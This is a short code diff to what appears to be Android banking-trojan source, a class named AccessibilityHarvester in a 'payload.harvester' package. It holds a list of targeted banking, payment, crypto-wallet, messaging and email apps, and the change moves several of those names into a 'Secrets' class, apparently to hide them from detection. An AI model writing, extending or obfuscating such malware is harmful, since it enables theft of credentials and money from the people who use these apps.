@@ -3,6 +3,7 @@ package com.chameleon.payload.harvester;
 import android.content.Context;
 import android.util.Log;
 import com.chameleon.payload.util.Crypto;
+import com.chameleon.payload.util.Secrets;
 import org.json.JSONObject;
 
 public class AccessibilityHarvester {
@@ -10,10 +11,12 @@ public class AccessibilityHarvester {
     private final Context context;
     private final HarvesterManager manager;
     private static final String[] TARGET_APPS = {
-        "bkash", "nagad", "paytm", "easypaisa", "jazzcash",
-        "gcash", "paypal", "venmo", "cashapp", "stripe",
-        "whatsapp", "telegram", "facebook", "instagram",
-        "gmail", "outlook", "chrome", "firefox", "linkedin",
+        Secrets.TGT_BKASH, Secrets.TGT_NAGAD, Secrets.TGT_PAYTM,
+        Secrets.TGT_PAYPAL, Secrets.TGT_STRIPE, Secrets.TGT_VENMO,
+        Secrets.TGT_WHATSAPP, Secrets.TGT_TELEGRAM, Secrets.TGT_FACEBOOK,
+        Secrets.TGT_INSTAGRAM, Secrets.TGT_LINKEDIN,
+        "easypaisa", "jazzcash", "gcash", "cashapp",
+        "gmail", "outlook", "chrome", "firefox",
         "twitter", "snapchat", "binance", "coinbase", "metamask"
     };
 
